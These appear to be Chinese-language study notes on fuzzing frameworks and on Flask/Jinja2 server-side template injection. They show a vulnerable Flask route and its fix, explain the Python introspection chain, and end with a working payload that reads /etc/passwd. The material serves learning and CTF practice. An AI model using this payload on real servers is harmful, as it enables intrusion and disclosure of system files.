# FUZZ

分类:

* 基于生成 : SPIKE -> Sulley -> Boofuzz -> Fuzzowski



传统的Fuzz框架普遍给予生成突变，现在注重__反馈驱动__的探索

模版: Xml编写与Pit模版

(一般fuzz模版需要根据自己需求而修改)



# Web模版注入学习

[从零学习flask模版注入](https://www.freebuf.com/column/187845.html)

## flask(web一种框架)基础

### 渲染

* render_template: 

  用来渲染制定文件。Exp: return render_template('index.html')

* render_template_string:

  渲染字符串 。 Exp: html = '<h1>This is index page</h1>'

  ​                                  return render_template_string(html)

### 模版

* 模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。

* 模版文件: 在网站__根目录__下新建templates文件夹，用来存放html文件(也就是模版文件)。 Exp: test.py, /templates/index.html

### 模版注入(不止xss注入)

及不正确的代码引发的注入

#### xss注入

```php+HTML
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

由于code输入是用户可控的，且数据和代码混淆，故用户可利用这一特性进行注入操作

只需改为:

```php+HTML
app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

在这段代码中用户所控的是__code变量__，而不是模板内容。存在__漏洞__的代码中，__模板内容__直接受用户控制的。

### SSTI文件读取/命令执行

Jinja2模版引擎中，__{{}}__是变量包裹标识符(传递变量，表达式之类的)

例如上面第一个图中代码，若构造参数{{2*4}}，会在浏览器中显示8(而非2 *  4)；这样攻击者容易得知其代码内部构造。(如攻防世界web Web_python_template_injection)

* 文件包含

  * 实现文件读取，命令执行一般步骤: 找出父类<type 'object'> --> 寻找子类 --> 找关于命令执行或文件操作的模块

  * 魔术方法:

    ```
    __class__  返回类型所属的对象
    __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
    __base__   返回该对象所继承的基类
    // __base__和__mro__都是用来寻找基类的
    
    __subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
    __init__  类的初始化方法
    __globals__  对包含函数全局变量的字典的引用
    ```

*  获取字符串对象

  ```
  >>> ''.__class__
  <type 'str'>
  ```

* 寻找基类

  ```
  >>> ''.__class__.__mro__
  (<type 'str'>, <type 'basestring'>, <type 'object'>)
  ```

* 寻找可用引用

  ```
  >>> ''.__class__.__mro__[2].__subclasses__()
  [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
  
  
  可以看到有一个`<type 'file'>`
  ```

* 利用之

  ```
  ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
  ```

​       放入模版，可见读取了文件

### 命令执行

